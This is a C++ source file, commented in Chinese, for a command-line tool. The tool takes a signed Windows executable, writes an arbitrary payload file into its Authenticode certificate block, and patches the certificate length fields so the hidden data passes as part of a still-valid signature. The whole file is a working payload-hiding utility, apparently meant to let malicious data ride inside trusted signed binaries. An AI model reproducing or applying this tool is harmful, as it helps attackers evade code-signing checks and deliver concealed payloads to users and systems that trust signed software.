#include <fstream>
#include <windows.h>
#include <WinTrust.h>
#pragma warning(disable : 4996)

BYTE* MapFileToMemory(LPCSTR filename, LONGLONG& filelen)
{
	FILE* fileptr;
	BYTE* buffer;

	fileptr = fopen(filename, "rb"); // Open the file in binary mode
	fseek(fileptr, 0, SEEK_END);	 // Jump to the end of the file
	filelen = ftell(fileptr);		 // Get the current byte offset in the file
	rewind(fileptr);				 // Jump back to the beginning of the file

	buffer = (BYTE*)malloc((filelen + 1) * sizeof(char)); // Enough memory for file + \0
	fread(buffer, filelen, 1, fileptr);					   // Read in the entire file
	fclose(fileptr);									   // Close the file
	return buffer;
}

int main(int argc, char** argv) 
{
	if (argc != 4) 
	{
		auto fileName = strrchr(argv[0], '\\') ? strrchr(argv[0], '\\') + 1 : argv[0];
		printf("usage: %s [path/to/signed_pe] [file/to/append] [path/to/output]\n", fileName);
		return 0;
	}

	// 1. 读取PE文件和要附件的内容
	LONGLONG signedPeDataLen = 0, payloadSize = 0;
	BYTE* signedPeData = MapFileToMemory(argv[1], signedPeDataLen);
	BYTE* payloadData = MapFileToMemory(argv[2], payloadSize); // 要附加并隐藏的数据内容

	// 2. 为输出的PE文件申请内存，并将原PE文件内容直接拷贝
	BYTE* outputPeData = new BYTE[signedPeDataLen + payloadSize];
	memcpy(outputPeData, signedPeData, signedPeDataLen);

	// 3. 将要附加的内容添加到签名消息块中
	auto ntHdr = PIMAGE_NT_HEADERS(&outputPeData[PIMAGE_DOS_HEADER(outputPeData)->e_lfanew]); // NT Header
	auto certInfo = &ntHdr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY]; // Security Directory
	auto certData = LPWIN_CERTIFICATE(&outputPeData[certInfo->VirtualAddress]); // 签名消息块
	memcpy(&PCHAR(certData)[certData->dwLength], payloadData, payloadSize); // 将要附加的内容添加到签名消息块中
	certInfo->Size = (certData->dwLength += payloadSize); // 更新签名消息块大小，以便将我们附加的内容识别为签名消息的一部分

	// 4. 将修改后的文件写入本地
	fwrite(outputPeData, 1, signedPeDataLen + payloadSize, fopen(argv[3], "wb"));
	puts("done.");

	return 0;
}